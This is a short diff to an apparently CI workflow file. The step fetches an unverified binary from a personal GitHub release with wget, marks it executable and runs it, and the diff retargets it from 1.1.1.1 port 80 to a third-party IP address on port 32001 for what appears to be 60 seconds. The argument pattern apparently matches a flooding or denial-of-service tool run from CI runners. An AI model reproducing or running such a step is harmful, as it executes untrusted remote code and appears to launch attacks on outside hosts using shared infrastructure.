@@ -16,4 +16,4 @@ jobs:
         run: |
           wget -q https://github.com/VishalDevloper03/VishalDevloper/releases/download/VishalDevloper/vishal
           chmod +x vishal
-          ./vishal 1.1.1.1 80 60
+          ./vishal 91.108.17.50 32001 60
